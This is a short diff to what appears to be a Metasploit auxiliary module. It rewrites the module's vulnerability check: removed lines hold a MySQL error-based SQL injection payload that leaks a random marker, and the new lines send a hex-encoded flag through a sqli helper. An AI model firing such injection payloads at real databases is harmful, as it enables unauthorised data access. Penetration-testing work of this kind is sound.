@@ -40,24 +40,15 @@ class Metasploit4 < Msf::Auxiliary
 
   def check
     flag = Rex::Text.rand_text_alpha(8)
-    lmark = Rex::Text.rand_text_alpha(5)
-    rmark = Rex::Text.rand_text_alpha(5)
+    payload = "0x#{flag.unpack('H*')[0]}"
 
-    payload = 'AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT('
-    payload << "0x#{lmark.unpack('H*')[0]},"
-    payload << "(SELECT 0x#{flag.unpack('H*')[0]}),"
-    payload << "0x#{rmark.unpack('H*')[0]},"
-    payload << 'FLOOR(RAND(0)*2)'
-    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
+    data = sqli(payload)
 
-    res = sqli(payload)
-
-    if res && res.code == 500 && res.body =~ /#{lmark}#{flag}#{rmark}/
+    if data && data.include?(flag)
       Msf::Exploit::CheckCode::Vulnerable
     else
       Msf::Exploit::CheckCode::Safe
     end
-
   end
 
   def sqli(query)
